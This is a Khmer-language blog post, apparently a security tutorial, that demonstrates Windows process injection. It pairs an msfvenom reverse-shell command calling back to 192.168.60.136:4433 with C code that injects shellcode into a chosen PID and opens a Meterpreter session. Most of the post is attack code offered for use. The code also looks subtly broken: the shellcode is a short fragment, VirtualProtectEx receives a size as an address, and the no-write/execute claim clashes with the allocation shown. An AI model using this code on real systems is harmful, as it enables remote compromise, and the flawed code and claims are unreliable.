---
title: "Process Injection without Write/Execute Permission"
date: 2023-06-21T21:01:06+07:00
description: ចាក់បញ្ជូល Shellcode ក្នុង Process ដោយគ្មាន Write/Exec Allocation
draft: false
hideToc: false
enableToc: true
enableTocContent: false
author: thik
authorEmoji: 🐱
tags: 
- c-shellcode
categories:
- Process Injection
series:
- WinExE
image: images/feature3/code-file.png
---

#### Pwn Self Injection

បង្កើត Payload ដោយប្រើប្រាស់ Shellcode ជាភាសារ C គោលដៅលើម៉ាស៊ីន 64 bit ។

{{< highlight bash "linenos=table" >}}
msfvenom -p windows/x64/shell_reverse_tcp lhost=192.168.60.136 lport=4433 -f c
{{< / highlight >}}

ខាងក្រោមជាវិធីសាស្ត្រសម្រាប់ចាក់ Process ចូលទៅកាន់ PID ណាមួយដោយមិនមាន DEP protection និងមិនមានសិទ្ធក្នុងការសរសេរចូល ឬដំណើរការបាន (Non-Writable / Non-Executable Allocation) ។

{{< highlight cpp "linenos=table" >}}
#include <stdio.h>
#include <Windows.h>

int main(int argc, char* argv[])
{
    unsigned char shellcode[] =
		"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
		"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
		"\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
		"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5";

    HANDLE processHandle;
    HANDLE remoteThread;
    PVOID remoteBuffer;
    DWORD oldPerms;
    DWORD PID = 1524;
    printf("Injecting to PID: %i", PID);
    processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
    remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READ);
    WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL);
    VirtualProtectEx(processHandle, (LPVOID)sizeof(processHandle), sizeof(shellcode), PAGE_READONLY, &oldPerms);
    remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
    CloseHandle(processHandle);

    return 0;
}
{{< / highlight >}}

កែត្រង់ PID បន្ទាប់មក Compile កូដខាងលើតាមធម្មតា (សម្រាប់ Visual Studio 20xx តម្រូវឲ្យធ្វើការបិទ DEP Protection មុននិង Build) បន្ទាប់មកសូមសាកល្បងបើកដំណើរការ ។

![Pwn Process Injection Non-Write/Exec Allocation](/en/posts/img/2023/06/process-injection-bypass-write-exec/pwn-process-injection.png)
![Meterpreter](/en/posts/img/2023/06/process-injection-bypass-write-exec/meterpreter.png)

ជោគជ័យ!!! ពេលនេះយើងបានចាក់ Shellcode ចូលទៅក្នុង Process នៃកម្មវិធី Notepad.exe តាមរយៈ PID 1524 ដោយមិនមានសិទ្ធ Write ឬ Execute បានសម្រេច ៕

<b>សម្រង់ចេញពី៖</b> [XRET2PWN](https://xret2pwn.github.io/process-inection/)